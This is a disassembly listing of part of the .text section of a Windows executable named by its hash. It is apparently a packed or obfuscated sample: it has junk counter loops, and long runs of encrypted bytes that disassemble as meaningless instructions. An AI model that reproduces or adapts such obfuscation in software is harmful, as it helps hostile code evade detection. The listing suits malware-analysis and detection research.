
72ac32ed66410a996440dbf9baac78ac82d96864177125cb376b104805b839e4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     bh,ch
  4011b8:	dec    ecx
  4011b9:	mov    eax,ds:0x7e7e7e37
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR ds:0xf330f00,edx
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x491bb739
  40126d:	lods   al,BYTE PTR ds:[esi]
  40126e:	(bad)  
  401270:	pop    edi
  401271:	(bad)  
  401272:	xor    al,bl
  401274:	inc    edx
  401275:	loop   0x40121f
  401277:	mov    esp,0x70478a3e
  40127c:	out    0x9c,eax
  40127e:	cmp    al,0xf6
  401280:	xchg   ecx,eax
  401281:	pop    eax
  401282:	js     0x4012d7
  401284:	push   ebx
  401285:	int    0x77
  401287:	mov    bl,0xa9
  401289:	lods   al,BYTE PTR ds:[esi]
  40128a:	xchg   ebx,eax
  40128b:	inc    ebp
  40128c:	daa    
  40128d:	stc    
  40128e:	jns    0x40123a
  401290:	pusha  
  401291:	repnz call 0xc4cb:0x6901ae5d
  401299:	retf   0x6cb
  40129c:	add    DWORD PTR [edx+ebp*8+0xd674ab4],edx
  4012a3:	inc    ebp
  4012a4:	mov    BYTE PTR [edi],dh
  4012a6:	cmp    DWORD PTR [ebx],esp
  4012a8:	and    al,0x20
  4012aa:	icebp  
  4012ab:	pusha  
  4012ac:	push   ebx
  4012ad:	imul   eax,ecx,0xa747a5c3
  4012b3:	out    0xf5,eax
  4012b5:	stos   BYTE PTR es:[edi],al
  4012b6:	sub    BYTE PTR [ecx],bl
  4012b8:	je     0x401308
  4012ba:	push   ebx
  4012bb:	minps  xmm1,XMMWORD PTR [ecx]
  4012be:	fcmovb st,st(5)
  4012c0:	mov    BYTE PTR [ebx-0x6c0c33b6],dh
  4012c6:	dec    esp
  4012c7:	fstp   TBYTE PTR [edx-0x11b35900]
  4012cd:	mov    al,0xd6
  4012cf:	sar    DWORD PTR [edi-0x6],0xbf
  4012d3:	adc    eax,ebp
  4012d5:	test   al,0xee
  4012d7:	into   
  4012d8:	adc    bh,BYTE PTR [ebp+0x639fc6a5]
  4012de:	xchg   esp,eax
  4012df:	loope  0x4012ca
  4012e1:	push   esp
  4012e2:	cmp    eax,0x965b19c7
  4012e7:	mov    eax,0x3c24b48a
  4012ec:	or     eax,0x5046b114
  4012f1:	cld    
  4012f2:	mov    DWORD PTR [esi+0x6f384066],esi
  4012f8:	mul    DWORD PTR [edi-0x6b]
  4012fb:	or     al,0xc
  4012fd:	in     eax,0xe6
  4012ff:	pop    eax
  401300:	inc    eax
  401301:	sbb    edi,esp
  401303:	imul   ah
  401305:	pop    eax
  401306:	lods   al,BYTE PTR ds:[esi]
  401307:	and    eax,0x3a20c29
  40130c:	mov    ch,0xb4
  40130e:	mov    edi,0x975c8c6c
  401313:	mov    esp,0xdf15631e
  401318:	cmp    ah,al
  40131a:	call   0x9fed:0xa359fb72
  401321:	adc    eax,0x3a0c2a6a
  401326:	and    al,cl
  401328:	in     eax,0x1f
  40132a:	jg     0x40134e
  40132c:	adc    DWORD PTR [ecx+0x2e13b365],0xffffffb1
  401333:	mov    ds:0x3c1817a0,al
  401338:	mov    ds:0x393871e7,eax
  40133d:	sub    eax,0x8bbb686
  401342:	jne    0x40131b
  401344:	cmp    eax,0x458906e5
  401349:	hlt    
  40134a:	and    DWORD PTR ds:0x4337d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	jo     0x40137f
  4013b5:	enter  0xfa6e,0x7f
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013f2
  4013c0:	and    BYTE PTR [eax+eiz*4-0x19],ch
  4013c4:	mov    eax,0x188a85bf
  4013c9:	mov    ah,cl
  4013cb:	ret    
  4013cc:	dec    esi
  4013cd:	ret    
  4013ce:	aam    0xf8
  4013d0:	ss call 0xa31245b6
  4013d6:	xchg   esi,eax
  4013d7:	test   eax,0x3cd222de
  4013dc:	pop    esi
  4013dd:	sti    
  4013de:	(bad)  
  4013df:	test   al,0x1
  4013e1:	iret   
  4013e2:	cld    
  4013e3:	loop   0x401457
  4013e5:	dec    edi
  4013e6:	pop    ecx
  4013e7:	add    edx,DWORD PTR [edx]
  4013e9:	jmp    0xa4444182
  4013ee:	mov    ah,ah
  4013f0:	xchg   ebp,eax
  4013f1:	gs pop ebp
  4013f3:	aaa    
  4013f4:	add    DWORD PTR [ebx],esp
  4013f6:	enter  0x8084,0x71
  4013fa:	sub    ch,bl
  4013fc:	xor    DWORD PTR [ecx+0x14],ebp
  4013ff:	shl    DWORD PTR [ebx+0x73aa6199],0x8b
  401406:	xor    eax,0xf56e164d
  40140b:	test   BYTE PTR ds:0xb948fdf0,0xa2
  401412:	mov    bl,BYTE PTR [edi+esi*8-0x201f8cf3]
  401419:	inc    ebx
  40141a:	rol    BYTE PTR [ebx],0x93
  40141d:	popa   
  40141e:	adc    al,0xc3
  401420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401421:	neg    DWORD PTR [ecx+0x49]
  401424:	add    BYTE PTR gs:[edx-0x7a],0x76
  401429:	xchg   ebx,eax
  40142a:	clc    
  40142b:	lods   al,BYTE PTR ds:[esi]
  40142c:	inc    eax
  40142d:	inc    ebx
  40142e:	mov    eax,ds:0xb3b9ec95
  401433:	rcr    DWORD PTR [eax+0x25cd68e0],1
  401439:	addr16 icebp 
  40143b:	xor    ebp,DWORD PTR [eax]
  40143d:	mov    ch,0x2c
  40143f:	dec    ebx
  401440:	push   esi
  401441:	aad    0xb2
  401443:	xchg   esi,eax
  401444:	(bad)
  401447:	iret   
  401448:	jb     0x40145f
  40144a:	add    DWORD PTR [edi],esi
  40144c:	repnz shr ecx,1
  40144f:	xadd   DWORD PTR [esi+0x733039a0],esp
  401456:	or     esp,DWORD PTR [ebp-0x2a]
  401459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40145a:	mov    esp,0x7b1f099d
  40145f:	sbb    BYTE PTR [esp+ebx*4],0xba
  401463:	cs sbb eax,0x4d135857
  401469:	scas   eax,DWORD PTR es:[edi]
  40146a:	hlt    
  40146b:	jae    0x4014aa
  40146d:	push   ds
  40146e:	outs   dx,DWORD PTR ds:[esi]
  40146f:	fistp  WORD PTR ds:0xdbcbfbdd
  401475:	pop    ecx
  401476:	cmc    
  401477:	pop    ebp
  401478:	xchg   BYTE PTR [esi-0x7e17d8b4],ch
  40147e:	nop
  40147f:	pop    ebp
  401480:	jmp    0x6a1c:0x151a7995
  401487:	sbb    ah,bh
  401489:	fstp   st(6)
  40148b:	or     DWORD PTR [ebx],esp
  40148d:	jg     0x4014e3
  40148f:	mov    dl,0x76
  401491:	push   esp
  401492:	mov    ch,0x3c
  401494:	xchg   esp,eax
  401495:	inc    esi
  401496:	iret   
  401497:	popf   
  401498:	imul   eax,edx,0x11
  40149b:	add    DWORD PTR [eax-0x9],ebp
  40149e:	fcom   QWORD PTR [ebx+0x10]
  4014a1:	xor    DWORD PTR [ecx+0x32eebede],esp
  4014a7:	arpl   WORD PTR ds:0x8a32806b,ax
  4014ad:	add    al,0x5b
  4014af:	mov    al,ds:0x4727aa21
  4014b4:	cmc    
  4014b5:	mov    eax,ds:0xc592fa67
  4014ba:	xor    al,0xa8
  4014bc:	pop    edx
  4014bd:	push   esp
  4014be:	mov    esi,0x4d1cca25
  4014c3:	jmp    0x4014bb
  4014c5:	mov    bh,0x7
  4014c7:	xor    eax,0xbc3eec47
  4014cc:	and    DWORD PTR [edi+0x316ef87d],edx
  4014d2:	mov    ebp,0x1c1c757e
  4014d7:	jecxz  0x401551
  4014d9:	addr16 jne 0x401555
  4014dc:	mul    DWORD PTR [edi+esi*2+0x7a]
  4014e0:	popa   
  4014e1:	in     eax,0x1
  4014e3:	and    eax,0x16355d6b
  4014e8:	sbb    DWORD PTR [edx],0x32
  4014eb:	dec    ebx
  4014ec:	imul   DWORD PTR [edx]
  4014ee:	or     al,0x4a
  4014f0:	retf   0x7fa8
  4014f3:	mov    edx,0x97cd3e24
  4014f8:	fsubr  DWORD PTR [eax]
  4014fa:	pusha  
  4014fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014fc:	test   BYTE PTR [ebx],ch
  4014fe:	test   eax,0xbff3db6e
  401503:	mov    ds:0x7d1ed88a,al
  401508:	add    ebp,DWORD PTR [esi-0x65]
  40150b:	push   ecx
  40150c:	sub    al,0xb7
  40150e:	sbb    edi,DWORD PTR [esi-0x7deca6f]
  401514:	mov    ebx,0xd9361f54
  401519:	lea    ebx,[esi]
  40151b:	mov    esp,DWORD PTR [ebp+edi*4-0x27]
  40151f:	mov    eax,ds:0x7dcbd253
  401524:	xchg   DWORD PTR [ecx],edi
  401526:	retf   0x52c2
  401529:	cld    
  40152a:	idiv   DWORD PTR ds:0xb7798c9d
  401530:	push   0x73
  401532:	sub    al,0x4
  401534:	mov    ah,0x42
  401536:	xor    eax,0x68b3f02d
  40153b:	jnp    0x40158e
  40153d:	jbe    0x4014d1
  40153f:	lea    ebp,ds:0x458b954a
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43378f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x20f899e3]
  401564:	jmp    0x7ebe926f
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x401519
  40156e:	push   eax
  40156f:	popf   
  401570:	mov    esp,0xea80032f
  401575:	jae    0x401556
  401577:	(bad)  
  401578:	imul   esp,DWORD PTR ds:0x2a26fd3a,0x4a2dfac4
  401582:	in     al,0xad
  401584:	int3   
  401585:	outs   dx,BYTE PTR ds:[esi]
  401586:	inc    edi
  401587:	push   ds
  401588:	inc    ebp
  401589:	outs   dx,BYTE PTR ds:[esi]
  40158a:	mov    esp,0x2ecf3615
  40158f:	cs add eax,0xa238b335
  401595:	out    dx,al
  401596:	pop    eax
  401597:	ret    
  401598:	xchg   edx,eax
  401599:	jg     0x4015a8
  40159b:	xor    al,0x58
  40159d:	mov    WORD PTR [edx-0x7c],gs
  4015a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015a1:	or     al,0xa2
  4015a3:	ins    DWORD PTR es:[edi],dx
  4015a4:	jno    0x4015c7
  4015a6:	pop    ebp
  4015a7:	mov    ecx,DWORD PTR [ebx-0x16]
  4015aa:	mov    cs,WORD PTR [edi-0x70c42aa1]
  4015b0:	cld    
  4015b1:	mov    eax,0x16f55a57
  4015b6:	mov    bl,0x1c
  4015b8:	cmp    BYTE PTR [eax+0x41],cl
  4015bb:	pop    esp
  4015bc:	jle    0x401561
  4015be:	inc    ebx
  4015bf:	fwait
  4015c0:	(bad)
  4015c3:	nop
  4015c4:	push   ds
  4015c5:	mov    ebx,0xda578b89
  4015ca:	pop    esi
  4015cb:	push   es
  4015cc:	xor    al,al
  4015ce:	daa    
  4015cf:	jecxz  0x40162f
  4015d1:	jmp    0x69d8:0x952db9d9
  4015d8:	scas   eax,DWORD PTR es:[edi]
  4015d9:	inc    edi
  4015da:	arpl   bx,di
  4015dc:	mov    edi,0x92a62f31
  4015e1:	dec    esp
  4015e2:	std    
  4015e3:	cdq    
  4015e4:	mov    cl,0x1c
  4015e6:	xchg   ecx,eax
  4015e7:	ja     0x4015b3
  4015e9:	(bad)  
  4015ea:	push   0x7f
  4015ec:	xchg   ebx,eax
  4015ed:	mov    ebp,?
  4015ef:	inc    ecx
  4015f0:	ret    0xf59b
  4015f3:	or     BYTE PTR [esp-0x59],dh
  4015f7:	imul   ebx,DWORD PTR [ebx-0x19],0xffffffed
  4015fb:	cmp    DWORD PTR [ebx-0x74],eax
  4015fe:	mov    ecx,0x60add931
  401603:	push   cs
  401604:	cli    
  401605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401606:	fbstp  TBYTE PTR [ecx+edi*2+0x35e6197]
  40160d:	push   es
  40160e:	fs out dx,al
  401610:	and    BYTE PTR [ebx],0x3d
  401613:	clc    
  401614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401615:	xchg   ebx,eax
  401616:	loope  0x4015d0
  401618:	pop    ebx
  401619:	fidiv  WORD PTR [ecx]
  40161b:	js     0x4015ab
  40161d:	outs   dx,BYTE PTR ds:[esi]
  40161e:	xchg   al,al
  401620:	mov    DWORD PTR [ecx+ebp*1-0x31c8e99b],edi
  401627:	cmp    al,ah
  401629:	sbb    BYTE PTR [eax],0x7d
  40162c:	(bad)
  40162f:	xor    BYTE PTR [ebx+ebx*1+0x71ee89d7],dh
  401636:	aam    0xdf
  401638:	jbe    0x4015da
  40163a:	xchg   ebp,esi
  40163c:	mov    ebx,0x14ebc0da
  401641:	lods   eax,DWORD PTR ds:[esi]
  401642:	inc    eax
  401643:	outs   dx,BYTE PTR ds:[esi]
  401644:	xor    dh,BYTE PTR [ebp+0x3e]
  401647:	scas   al,BYTE PTR es:[edi]
  401648:	adc    ch,BYTE PTR [ebp-0x68]
  40164b:	cmp    DWORD PTR [edx],eax
  40164d:	repz mov bl,BYTE PTR [ecx-0x6f]
  401651:	mov    ?,WORD PTR [edx+edi*8]
  401654:	dec    ebp
  401655:	or     esi,edi
  401657:	pop    eax
  401658:	sub    eax,DWORD PTR [esi]
  40165a:	add    DWORD PTR [ebp-0x61],0x4b50d877
  401661:	and    al,0xcb
  401663:	mov    edx,0x9df9a95a
  401668:	cmp    eax,0x6cafeb43
  40166d:	icebp  
  40166e:	outs   dx,BYTE PTR ds:[esi]
  40166f:	inc    esi
  401670:	js     0x4016e8
  401672:	in     al,dx
  401673:	and    ebx,DWORD PTR [edx-0x20]
  401676:	out    0x98,al
  401678:	xchg   esp,eax
  401679:	or     DWORD PTR [eax-0x2886dd60],ebp
  40167f:	sub    DWORD PTR [eax],ecx
  401681:	jbe    0x401637
  401683:	xchg   ebp,eax
  401684:	pop    ds
  401685:	mov    eax,DWORD PTR [eax-0x78b77ca7]
  40168b:	out    0x9f,al
  40168d:	pusha  
  40168e:	pop    ebp
  40168f:	cmp    eax,0xd36bd76
  401694:	sub    bl,BYTE PTR [ebx-0x60c72d3f]
  40169a:	sbb    esp,DWORD PTR [ecx]
  40169c:	rcl    esi,0xa7
  40169f:	dec    ecx
  4016a0:	loopne 0x40167d
  4016a2:	ss das 
  4016a4:	jbe    0x40170d
  4016a6:	call   0x3e3f6c08
  4016ab:	add    ah,BYTE PTR [edx-0x1c9b5bf3]
  4016b1:	dec    edi
  4016b2:	xchg   ecx,eax
  4016b3:	mov    al,ds:0x80b2c1fa
  4016b8:	inc    edx
  4016b9:	fabs   
  4016bb:	mov    dh,0x27
  4016bd:	xor    BYTE PTR ds:0xac0528e6,0x33
  4016c4:	add    edx,esi
  4016c6:	repnz xchg ebp,eax
  4016c8:	repnz cmp eax,0x334b406d
  4016ce:	lds    ecx,FWORD PTR [edi+ebp*2-0x47]
  4016d2:	and    esi,DWORD PTR [edi-0x56]
  4016d5:	cmp    ah,0x7e
  4016d8:	jle    0x401743
  4016da:	sar    BYTE PTR [esi],0x72
  4016dd:	mov    ah,0xc0
  4016df:	mov    esp,0x5f49842c
  4016e4:	xchg   DWORD PTR [ecx],ebx
  4016e6:	pop    edx
  4016e7:	dec    edx
  4016e8:	mov    bh,0xf4
  4016ea:	inc    ebp
  4016eb:	and    DWORD PTR [eax],edx
  4016ed:	nop
  4016ee:	fld    TBYTE PTR [ebx]
  4016f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xa43f6ade
  4018e9:	lods   eax,DWORD PTR ds:[esi]
  4018ea:	dec    esp
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018c1
  4018f4:	xor    dl,BYTE PTR [esi+edx*1]
  4018f7:	rcl    edx,cl
  4018f9:	xchg   esp,eax
  4018fa:	arpl   WORD PTR ds:0x578e68ab,bx
  401900:	std    
  401901:	mov    esi,0x942ec79d
  401906:	sub    eax,0x80d6eb40
  40190b:	push   esi
  40190c:	fidivr DWORD PTR [edi+0x46e86812]
  401912:	mov    dh,0xf5
  401914:	aam    0x8b
  401916:	push   0x1aabffff
  40191b:	fist   WORD PTR [edi]
  40191d:	push   esi
  40191e:	sub    cl,BYTE PTR [esp+ecx*8]
  401921:	pop    edx
  401922:	int3   
  401923:	pop    es
  401924:	push   esp
  401925:	imul   eax,DWORD PTR [edi],0x2e
  401928:	(bad)  
  401929:	pop    eax
  40192a:	mov    eax,ds:0x552eb960
  40192f:	pop    ebp
  401930:	mov    eax,0x5bd95957
  401935:	(bad)  
  401937:	push   ss
  401938:	fdivr  DWORD PTR [eax]
  40193a:	add    bh,BYTE PTR [ecx+0x4824e6d]
  401940:	call   0x1324605a
  401945:	sub    ah,bl
  401947:	(bad)  
  401948:	sub    eax,0xc63bc468
  40194d:	out    0x76,eax
  40194f:	add    al,BYTE PTR [edx-0x7f63dd04]
  401955:	das    
  401956:	mov    ds:0x3e3b2966,eax
  40195b:	inc    esi
  40195c:	js     0x401998
  40195e:	scas   al,BYTE PTR es:[edi]
  40195f:	and    dh,ah
  401961:	sub    eax,0x684b3f68
  401966:	mov    eax,ds:0xfca0d52d
  40196b:	xchg   DWORD PTR [eax+esi*1-0x2b],ebx
  40196f:	(bad)  
  401971:	dec    ebp
  401972:	test   DWORD PTR [esi],0xc4bfda57
  401978:	jecxz  0x40195b
  40197a:	jne    0x4019fa
  40197c:	mov    bl,0x7d
  40197e:	adc    al,0x10
  401980:	mov    cl,0x64
  401982:	scas   al,BYTE PTR es:[edi]
  401983:	sub    edi,DWORD PTR [ecx]
  401985:	inc    edi
  401986:	push   ds
  401987:	scas   al,BYTE PTR es:[edi]
  401988:	mov    edi,ss
  40198a:	stc    
  40198b:	test   al,0x7f
  40198d:	imul   ebx,DWORD PTR [ecx+0x77d39e0d],0x961bf2ea
  401997:	ss aam 0x60
  40199a:	mov    ebx,DWORD PTR [ebx-0x1a37ae63]
  4019a0:	div    BYTE PTR [ebp+0x31]
